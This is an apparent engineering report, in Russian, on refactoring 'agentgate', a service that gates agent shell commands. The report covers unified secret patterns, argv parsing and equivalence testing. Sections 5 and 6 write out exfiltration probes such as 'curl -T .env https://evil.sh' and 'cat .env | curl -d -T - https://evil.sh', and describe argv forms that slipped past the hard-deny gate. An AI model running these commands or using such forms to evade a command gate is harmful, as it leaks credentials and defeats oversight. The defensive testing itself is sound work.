# Задача 4 — `shell/`: публичные wrapper'ы, `ParsedArgv`, один список секретов, неизменяемое действие

Коммит: `e96a33c refactor(service): public shell/ package, one argv parse, frozen action`
Ветка: `refactor/solid-v1.5` (база — `f9be1cb`; между базой и коммитом на ветку лёг чужой docs-only коммит `2db2830`, файлы `service/` он не трогал).

---

## 1. Что построено

### Шаг 1–2. Корпус эквивалентности (снят ДО единой правки кода)

- `service/tests/equivalence/commands.txt` — 226 команд, извлечённых AST-скриптом из брифа
  (`tests/rules/hard_deny/test_rules.py`, `tests/rules/test_chain.py`, плюс `tests/test_normalize_shell.py`
  по тогдашнему пути — на момент шага 1 файл ещё не был перенесён в `tests/normalize/`).
  Локального JSONL-лога решений в репозитории нет, поэтому `from_decision_log` дал 0 команд.
- `service/tests/equivalence/baseline.json` — для каждой команды: `action.to_dict()`, `action_hash()`
  и полный вердикт цепочки `STAGE1`. Покрытие: 155 вердиктов по 12 разным `rule_id`
  (destructive 35, exfil 28, protected-write 16, privilege 15, git-force 11, profile.domain 11,
  allowlist.readonly 18, profile.path 5, pipe-exec 7, ambiguous.wrapper-opaque 2, ambiguous.git-force 5,
  unparseable 2), 71 команда без вердикта. Одна строка (` `) отвергается схемой запроса — записана как
  `{"error": "ValidationError"}`, а не потеряна.
- `service/tests/equivalence/test_equivalence.py` — параметризованный тест, `ids=range(...)`.

**Доказательство честности эталона.** sha256 файла в момент снятия (до правок) и sha256 версии,
попавшей в коммит, совпадают:

```
7f292c7aa74a237636e64ca9b616ead1298d6a59bc4eccae912608e3d776f9cd  tests/equivalence/baseline.json
$ git log --oneline -- service/tests/equivalence/baseline.json
e96a33c refactor(service): public shell/ package, one argv parse, frozen action   # единственный коммит
```

Baseline **не перегенерировался ни разу** после снятия.

### Шаг 3. `agentgate/shell/wrappers.py`

Перенесены без изменения логики: `_WRAPPER_CMDS` → `WRAPPER_COMMANDS`, `_WRAPPER_VALUE_FLAGS` →
`WRAPPER_VALUE_FLAGS`, `_ENV_ASSIGNMENT` → `ENV_ASSIGNMENT`, `_TIMEOUT_DURATION` (осталась приватной),
`resolve_effective_argv`. Из hard-deny переехали `wrapper_chain_unresolved` →
`chain_unresolved(argv, wrapper_commands)` и её помощник `_consumed_a_possible_command`.

- **F11 закрыт**: `rules/hard_deny/shared.py` больше не импортирует подчёркнутые имена из
  `normalize/shell.py`. Проверено grep'ом — приватных импортов через границу пакета в `agentgate/` нет.
- `EFFECTIVE_WRAPPERS` (выбор ступени 1: sudo непрозрачен, xargs прозрачен) остался в `shared.py` и стал
  публичным; `wrapper_unresolved.py` теперь вызывает `chain_unresolved(argv, EFFECTIVE_WRAPPERS)` напрямую,
  промежуточная обёртка `shared.wrapper_chain_unresolved` удалена.
- Магическая `range(8)` заменена на именованную `_MAX_WRAPPER_CHAIN = 8` (значение то же).

### Шаг 4. `agentgate/shell/secrets.py` — один список

### Шаг 5. `agentgate/shell/argv.py` — `ParsedArgv`

По брифу, плюс один добавленный keyword-параметр — см. §5.

### Шаг 6. Четыре ручных цикла → `ParsedArgv`

| было | стало |
|---|---|
| `exfil._positional_args(argv, value_flags)` | `_read_argv(argv, frozenset(_SCP_RSYNC_VALUE_FLAGS)).positionals`, функция удалена |
| `exfil._sent_secret_paths` — ручной обход upload/ignore-флагов | `_uploaded_values(_parse_for_upload_scan(argv, exe), exe)` |
| `exfil._excluded_read_paths` — ручной обход ignore-флагов + два list-comprehension по `startswith("-")` | `parsed.values_of(*_IGNORE_VALUE_FLAGS)` + `_write_destinations()` |
| `exfil._consumes_piped_stdin` — ручной обход | тот же `_parse_for_upload_scan` + `_upload_target(...) == "-"` |

`grep -rn 'startswith("-")' agentgate/rules/`: **18 → 13**. Оставшиеся 13 — в модулях, которые эта задача
не переписывает (`git_force`, `privilege`, `destructive`, `protected_write`, `argv_paths`), плюс два в
`exfil.py`, которые не являются разбором argv: guard «значение не начинается с дефиса» и грамматика
кластера коротких опций в `_match_upload_flag`.

Дублирование знания убрано и внутри `exfil`: `_upload_target()` — единственное место, где живёт форма
значения upload-флага (`name=@path` / `@path` / `-`); её используют и `_upload_flag_value_paths`, и проверка
stdin.

### Шаг 7. Неизменяемое действие

- `Redirect`, `SimpleCommand`, `Flags`, `NormalizedAction` → `@dataclass(frozen=True)`.
- `_Walker` копит результат в собственных полях (`_commands`, пять булевых флагов) и собирает
  `NormalizedAction` **один раз** в `result()`. Мутаций `action.flags.x = True` и `action.paths = ...` в
  коде больше нет.
- `_collect_paths` перестал писать в чужой `Flags` — возвращает `_PathScan(paths, saw_unresolved)`.
- `normalize()` для не-shell инструментов (`normalize/__init__.py`) тоже перестроен на однократную сборку
  (`_file_action`), иначе frozen-модель не собиралась бы.
- **G1 / гайд 7.2**: молчаливый `except Exception` в `normalize_shell` получил
  `log.warning(..., exc_info=True)`. Поведение (`unparseable`) не изменилось.
- **Отступление от кода брифа**: в брифе `walker.result(raw)` вынесен *за* `try`. Я оставил его **внутри**
  `try`. Вынос убрал бы сбор путей и доменов из-под fail-closed обёртки: `ValueError` из `extract_domains`
  или падение `_collect_paths` уходили бы наружу 500-й ошибкой вместо `unparseable` → `ask`. Модуль
  документирует ровно это как инвариант, и на него есть тест
  (`test_unanticipated_exception_in_post_parse_work_is_still_fail_closed`).
- **Отступление от брифа, важное**: поля остались `list`, а не `tuple` — обоснование и доказательства в §4.

### Шаг 8. Перенос тестов

`tests/test_normalize_{shell,paths,domains,init}.py` → `tests/normalize/test_{shell,paths,domains,init}.py`.
Все четыре — `rename … (100%)`, то есть **побайтово без изменений**.

---

## 2. Результаты проверок

```
$ cd service && AGENTGATE_TEST_DB_URL=postgresql+asyncpg://agentgate:agentgate@localhost:5433/agentgate_test uv run pytest
834 passed in 16.41s
```

574 (было) + 226 (корпус) + 34 (новые: 11 argv, 8 secrets, 15 wrappers) = 834. Падений нет, warning'ов нет.

**Postgres на момент старта задачи не работал** (порт 5433 закрыт, контейнеров нет) — первый полный прогон
дал 41 ошибку подключения. Поднял только БД: `AGENTGATE_TOKEN=… docker compose up -d db` (переменная нужна
лишь для интерполяции сервиса `gate`, который я не запускал). После этого DB-тесты проходят.

**Контракты:**
```
$ uv run python scripts/export_contracts.py && uv run python scripts/export_openapi.py && git diff --exit-code ../contracts
contracts clean   # пустой diff
```

**Latency ступени 1** (`tests/rules/test_latency.py` зелёный), измерено одним и тем же скриптом на дереве
до и после, по 3 прогона каждое — цифры стабильны:

| | p50 |
|---|---|
| до (`f9be1cb`) | 0.141 ms |
| после | **0.161 ms** |
| порог | 1.0 ms |

Рост +0.02 мс (16 % бюджета вместо 14 %). Источник известен: `looks_like_path` для голого токена теперь
идёт через `matches_any` (нормализация пути + basename + `expanduser` по трём `~`-паттернам) и сверяется с
13 паттернами вместо 10. Порог не трогал.

---

## 3. TDD-доказательства

### `shell/secrets.py`

RED (`uv run pytest tests/shell/test_secrets.py -q`) — до создания модуля:
```
tests/shell/test_secrets.py:1: in <module>
    from agentgate.shell.secrets import SECRET_PATTERNS, is_secret_path
E   ModuleNotFoundError: No module named 'agentgate.shell.secrets'
ERROR tests/shell/test_secrets.py
1 error in 0.07s
```
Ожидаемо: тест обращается к модулю, которого ещё нет. GREEN после создания — `8 passed in 0.12s`
(5 тестов брифа + 3 моих на само объединение: `.npmrc`, `*.p12`, матч голого basename без workspace).

### `shell/argv.py`

RED (`uv run pytest tests/shell/test_argv.py -v`):
```
tests/shell/test_argv.py:1: in <module>
    from agentgate.shell.argv import ParsedArgv
E   ModuleNotFoundError: No module named 'agentgate.shell.argv'
1 error in 0.08s
```
GREEN — `11 passed in 0.01s` (все 11 тестов брифа, дословно).

### `shell/wrappers.py`

Здесь TDD в строгом смысле неприменим: шаг 3 — перенос работающего кода, а не новое поведение. Тесты
(15 штук) написаны как характеризующие: они фиксируют формы, которые до сих пор проверялись только
косвенно через таблицу DENY_CASES (`nice -n 10`, `env FOO=bar`, `timeout 30`, `env -i`, голый wrapper,
исчерпание границы цепочки, `chain_unresolved` depth/opaque/None). Переносить из
`tests/normalize/test_shell.py` было нечего: там нет ни одного теста, вызывающего `resolve_effective_argv`
напрямую — все идут через `normalize_shell`.

---

## 4. Главное решение: поля остались `list`, а не `tuple` (отступление от брифа)

Бриф в шаге 7 требует `list` → `tuple` в полях. Я сделал `frozen=True`, но **контейнеры оставил `list`**.
Причина — не удобство, а два измеренных факта.

**Факт 1. Переход на `tuple` — это изменение поведения прода, а не рефакторинг.**
`agentgate/rules/allowlist.py:95`:

```python
def _matches_prefix(cmd: SimpleCommand, prefixes: list[list[str]]) -> bool:
    return any(cmd.argv[: len(p)] == p for p in prefixes if p)
```

`argv` как tuple → срез тоже tuple → сравнение с `list` из профиля **всегда False**. То есть
`safe_prefixes` оператора (`[["npm","test"],["pytest"]]`) молча перестают работать: каждый настроенный
allow исчезает. Поймано тестами `tests/rules/test_chain.py::test_chain_shell[npm test-allow-allowlist.prefix]`
и `tests/rules/test_allowlist.py::test_allows_a_command_matching_a_safe_prefix`. Направление отказа
безопасное (allow → падаем в ступень 2), но это изменение публичного поведения, а не перенос.

**Факт 2. Переход на `tuple` ломает 27 ожиданий, из них 17 — в трёх «замороженных» файлах.**
Полный прогон с tuple-полями: `27 failed`. Из них
`tests/normalize/test_shell.py` — 15, `tests/rules/hard_deny/test_rules.py` — 2 (`assert a.commands == []`
→ `() == []`), `tests/rules/test_chain.py` — 3 (следствие факта 1), `tests/test_normalize_init.py` — 6,
`tests/rules/test_allowlist.py` — 1. Прямое требование задачи: ни одно ожидание в
`tests/rules/hard_deny/test_rules.py`, `tests/rules/test_chain.py`, `tests/normalize/test_shell.py`
меняться не должно.

**Что при этом достигнуто и что нет.** Достигнуто главное, ради чего шаг 7 существует: действие
собирается один раз и не переписывается после создания — `frozen=True` запрещает и `action.paths = …`,
и `action.flags.x = True`, то есть ровно те две мутации, которые в коде были. Не достигнуто: содержимое
списков технически ещё изменяемо (`action.paths.append(...)`). В кодовой базе такого нет ни одного места.

**Побочный эффект, которого нет.** `to_dict()` остаётся побайтово прежним (списки), значит и форма
JSONB-колонки, и ключ allow-кэша `action_hash()` не поехали — корпус это подтверждает. Если бы я всё же
перешёл на tuple, потребовался бы `dict_factory`, приводящий кортежи обратно к спискам (я его написал и
удалил вместе с откатом) — иначе `to_dict()` начал бы отдавать кортежи, а это уже видимое изменение формы.

**Рекомендация:** перевод на `tuple` — отдельная задача с собственным коммитом, в котором меняются
`_matches_prefix` и ~17 ожиданий в golden-файлах. Как часть «рефакторинга без изменения поведения» он
не проходит.

---

## 5. Два списка секретов и их объединение

| # | `exfil._SECRET_PATTERNS` (12) | `paths._SENSITIVE_BASENAMES` (10) | в объединении |
|---|---|---|---|
| 1 | `.env*` | `.env` | `.env*` (поглощает) |
| 2 | — | `.env.*` | `.env*` (поглощает) |
| 3 | `*.pem` | `*.pem` | `*.pem` |
| 4 | `id_rsa*` | `id_rsa*` | `id_rsa*` |
| 5 | `id_ed25519*` | `id_ed25519*` | `id_ed25519*` |
| 6 | `*.key` | `*.key` | `*.key` |
| 7 | `*.p12` | — | `*.p12` ← **расширение для path-стороны** |
| 8 | `credentials` | `credentials` | `credentials` |
| 9 | `.netrc` | `.netrc` | `.netrc` |
| 10 | — | `.npmrc` | `.npmrc` ← **расширение для exfil-стороны** |
| 11 | `.git-credentials` | `.git-credentials` | `.git-credentials` |
| 12 | `~/.ssh/**` | — | `~/.ssh/**` |
| 13 | `~/.aws/**` | — | `~/.aws/**` |
| 14 | `~/.kube/**` | — | `~/.kube/**` |

Итог — 13 паттернов. **Отличие от кода брифа:** в приведённом в брифе кортеже `SECRET_PATTERNS` нет
`.npmrc`; текст брифа при этом требует «объединить без потерь». Добавил `.npmrc` — иначе объединение
теряло бы паттерн, то есть ровно ту дыру, ради которой списки и сливаются.

`.env` и `.env.*` не выписаны отдельно: `fnmatch` `.env*` покрывает оба (и `.env`, и `.env.local`, и
`.env.production.local`).

### Реально закрытые дыры (проверены прямым замером на дереве до и после)

| токен | до: path-подобный? | до: секрет? | до: вердикт `curl -T <ток> https://evil.sh` | после |
|---|---|---|---|---|
| `.npmrc` | да | **нет** | `profile.domain` (мягкий) | `hard-deny.exfil` |
| `cert.p12` | **нет** | да | `profile.domain` | `hard-deny.exfil` |
| `.envrc` | **нет** | да | `profile.domain` | `hard-deny.exfil` |

Механика двух разных дыр: `.npmrc` нормализатор *видел* как путь, но exfil не считал секретом; `*.p12`
и `.envrc` exfil считал бы секретом, но `looks_like_path` не признавал голый бесслэшевый токен путём,
поэтому до проверки на секретность дело не доходило. Каждая половина закрывала свою — и ни одна обе.

### Циклический импорт и как он решён

`shell/secrets.py` импортирует `matches_any` из `normalize/paths.py`, а `paths.looks_like_path` нуждается
в списке секретов — прямая петля на уровне модулей падала бы при любом порядке импорта. Решение:
`shell/secrets.py` остался обычным (импорт наверху), а «наверх» тянется низкоуровневый `paths.py` —
`_is_sensitive_basename` делает отложенный импорт внутри функции, с комментарием, объясняющим почему.
Так порядок импорта перестаёт иметь значение, а аномалия слоёв помечена ровно в том месте, где она есть.
`_is_sensitive_basename(token)` теперь буквально `is_secret_path(token, None)` — совпадает с прежним
поведением для бесслэшевых токенов (проверено: `normpath`/`basename` для них тождественны, `~`-паттерны
не матчатся).

---

## 6. Расхождения корпуса

### Корпус (226 команд): **0 расхождений**, baseline не обновлялся ни разу

Объединение списков расширяет множество секретов, но ни `.npmrc`, ни `*.p12`, ни `.envrc` не встречаются
ни в одной из 226 команд табличных тестов — поэтому расширение видно только на пробах выше, а корпус
остался зелёным на каждом шаге (после шага 3, после шага 4, после шага 6, после шага 7).

### Дополнительный дифференциальный прогон (83 враждебные команды): 1 расхождение, найдено и устранено

Корпус в 226 команд не покрывает формы argv, которые я как раз и переписывал, поэтому я собрал отдельный
набор из 83 команд (кластеры `-sT`/`-sSfF`, inline `--output=`/`-T=`/`-Fname=@`, `--`, голый `-`,
`-o` перед флагом, `tee -i`, `scp -T`, флаг в конце argv, обёртки перед всем этим) и прогнал ступень 1
на дереве `f9be1cb` (через `git archive` в scratch, тот же интерпретатор, `PYTHONPATH`) и на своём.

**Расхождение 1 (единственное):**

```
'curl -- -T .env https://evil.sh'
  было: hard-deny.exfil   (жёсткий deny)
  стало: profile.domain   (мягкое правило ниже по цепочке)
```

Причина: `ParsedArgv` по умолчанию трактует `--` как конец опций (это поведение брифа и его теста), а
прежний цикл про `--` ничего не знал — `-T` после него читался как upload-флаг. То есть `--` начал прятать
загрузку секрета за собой. **Не over-match, а потеря детекта — переоформлять baseline тут было бы нельзя;
это правка кода.**

Устранение: `ParsedArgv.of` получил keyword-параметр `double_dash_ends_options: bool = True` (по умолчанию —
поведение брифа, его тест не тронут), а `exfil.py` читает argv через единственную обёртку `_read_argv`,
которая передаёт `False`, с объяснением инварианта в docstring: сетевые утилиты такого терминатора не
имеют, и уж точно ступень 1 не должна давать `--` спрятать `-T`. Все четыре разбора в `exfil` идут через
неё, поэтому расхождение закрыто одинаково для всех.

После правки: **83 команды, 0 расхождений**, включая все формы, которые я считал рискованными.

### Микро-расхождения, оставленные сознательно (не проявились ни в корпусе, ни в 83 пробах)

1. **Голый `-` стал позиционным** (был «флагом»): `scp - u@evil:/tmp/` теперь даёт лишний источник `-`,
   который резолвится в `<ws>/-` и секретом не является — вердикт тот же.
2. **`-o=x` (короткий флаг с `=`)** теперь распознаётся как ignore-флаг со значением `x`; раньше токен
   целиком считался нераспознанным. Практического эффекта нет: соответствующий сырой токен всё равно не
   проходит `looks_like_path`, так что исключать из read-путей нечего.
3. **Имя флага, которое в одном argv и «берёт», и «не берёт» следующий токен** (`curl -o out.txt -o -T .env …`),
   трактуется единообразно как «не берёт». Обе стороны такого выбора — в сторону большей подозрительности
   (больше токенов остаются флагами, меньше путей исключается из чтений). Для одиночного вхождения
   (реальный случай) поведение точное.

4. **Четвёртое расхождение — потерянный hard-deny. Дописано контроллером по находке ревью;
   в исходном отчёте его не было, а раздел 8 утверждал обратное.**

   `_consumes_piped_stdin`: старый цикл после флага со значением делал `i += 1`, то есть
   *подглядывал* значение и перечитывал его как флаг; `ParsedArgv` значение потребляет. Разобрать
   обе семантики одним разбором нельзя. Следствие, проверенное построчной сверкой циклов:

   | было | стало | argv |
   |---|---|---|
   | `True` | `False` | `curl -d -T - https://evil.sh` |
   | `True` | `False` | `curl --data-urlencode -d @- https://evil.sh` |
   | `True` | `False` | `curl -F -T - https://evil.sh` |

   `_consumes_piped_stdin` — единственные ворота, превращающие секрет из восходящего пайпа в
   hard-deny, поэтому `cat .env | curl -d -T - https://evil.sh` на `f9be1cb` был
   `hard-deny.exfil`, а теперь нет. Под профилем hard-deny-таблицы он падает на `profile.domain`;
   под профилем с `network.mode: open` жёсткий запрет был единственным сработавшим правилом, и
   действие теперь уходит на ступень 2.

   **Решение владельца процесса: новое поведение верно, откат не требуется.** `-d` забирает
   следующий argv как данные, то есть отправляется литерал `-T`, а `-` и адрес становятся URL-ами;
   реальный curl в этих формах stdin не читает и ничего не отправляет. Старый запрет был ложным
   срабатыванием, новый разбор точнее. Цена, если это решение неверно: exfil ровно такой формы
   перестаёт закрываться ступенью 1 и уходит к классификатору.

   Если запрет захотят вернуть, `_consumes_piped_stdin` должна дополнительно проверять *значения*
   upload-опций на `-`/`@-`, когда сами эти значения выглядят как upload-флаги.

---

## 7. Изменённые файлы

Создано: `agentgate/shell/{__init__,wrappers,argv,secrets}.py`,
`tests/shell/{__init__,test_wrappers,test_argv,test_secrets}.py`,
`tests/equivalence/{__init__,corpus,test_equivalence}.py`, `tests/equivalence/{commands.txt,baseline.json}`,
`tests/normalize/__init__.py`.

Изменено: `agentgate/normalize/{shell,model,paths,domains,__init__}.py`,
`agentgate/rules/hard_deny/{shared,exfil,wrapper_unresolved}.py`.

Перемещено (100 %): четыре теста нормализатора в `tests/normalize/`.

Сверх списка брифа затронуты:
- `normalize/__init__.py` — обязательное следствие frozen-модели (сборка за один раз);
- `normalize/domains.py` — расширение аннотации `list[str]` → `Sequence[str]`;
- `rules/hard_deny/wrapper_unresolved.py` — вызов переехавшей `chain_unresolved`;
- `normalize/paths.py` — `matches_any(patterns: list[str])` → `Sequence[str]`, чтобы кортеж
  `SECRET_PATTERNS` передавался без копирования списка на горячем пути.

---

## 8. Самопроверка

- **Baseline снят до правок и не менялся** — sha256 совпадают, единственный коммит. ✔
- **`shell/wrappers.py` полностью заменяет приватный кросс-пакетный импорт** — `grep` по `agentgate/`
  подчёркнутых импортов через границу пакета не находит. ✔
- **Объединение списков — истинное объединение**: обе исходные коллекции выписаны построчно (§5), ничего
  не потеряно; недостающий в коде брифа `.npmrc` добавлен. ✔
- **Четыре цикла на `-sT`, `--output=x`, `--`** — прогон 83 враждебных форм против дерева `f9be1cb`:
  0 расхождений после устранения найденного. Но «одинаково» — неверное слово: ревью нашло
  четвёртое расхождение, которого в этих 83 формах не было (`_consumes_piped_stdin`, флаг
  со значением, которое само выглядит как флаг). См. раздел 6, пункт 4. ⚠
- **Комментарии**: ссылок на задачи/PR/даты/«fix round N»/«Important N» в `agentgate/` не осталось ни
  одной (заодно вычищены 5 таких в `normalize/shell.py`, который задача и так переписывает). ✔
- **Вывод тестов чистый**: 834 passed, ни одного warning'а. ✔

---

## 9. Опасения

1. **`list` вместо `tuple`** (§4) — сознательное отступление от брифа с доказательствами. Неизменяемость
   получилась поверхностной. Если владелец хочет полную — это отдельная задача, где придётся тронуть
   `_matches_prefix` и golden-тесты.
2. **Отложенный импорт в `paths._is_sensitive_basename`** — обход цикла. Альтернатива без цикла —
   вынести `matches_any`/`is_within` в отдельный низкоуровневый модуль, но это изменения в пяти правилах,
   которых задача не касается.
3. **Latency 0.141 → 0.161 мс** — в 6 раз ниже порога, но рост системный (единый матчер вместо
   basename-only на горячем пути). Если бюджет когда-нибудь станет узким, первый кандидат —
   `expanduser` по трём `~`-паттернам внутри `matches_any`.
4. **`log.warning(..., exc_info=True)` на каждый неразбираемый ввод** — по брифу. Кривая команда
   пользователя теперь пишет traceback в логи на уровне WARNING; шума это добавляет, но именно этого
   требует G1 (баг в своём коде не должен быть неотличим от мусорного ввода).
5. **Postgres пришлось поднимать самому** — на момент старта он не работал, вопреки условию задачи.
   Контейнер `service-db-1` оставлен запущенным.
